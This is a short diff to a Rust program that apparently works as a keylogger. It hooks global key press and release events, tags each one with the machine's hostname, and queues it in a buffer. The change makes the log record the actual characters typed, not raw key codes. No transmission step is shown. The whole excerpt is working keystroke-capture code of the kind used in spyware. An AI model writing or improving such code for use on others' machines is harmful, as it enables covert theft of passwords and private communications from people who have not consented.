@@ -95,10 +95,10 @@ async fn main() {
                 tokio::spawn(async move {
                     match event.event_type {
                         EventType::KeyPress(key) => {
-                            tx.send(format!("{} | Pressed {:?}", gethostname().to_string_lossy(), key)).expect("Failed to add message to buffer");
+                            tx.send(format!("{} | Pressed {:?}", gethostname().to_string_lossy(), event.name.unwrap_or(format!("{:?}", key)))).expect("Failed to add message to buffer");
                         }
                         EventType::KeyRelease(key) => {
-                            tx.send(format!("{} | Released {:?}", gethostname().to_string_lossy(), key)).expect("Failed to add message to buffer")
+                            tx.send(format!("{} | Released {:?}", gethostname().to_string_lossy(), event.name.unwrap_or(format!("{:?}", key)))).expect("Failed to add message to buffer")
                         }
                         _ => {}
                     };
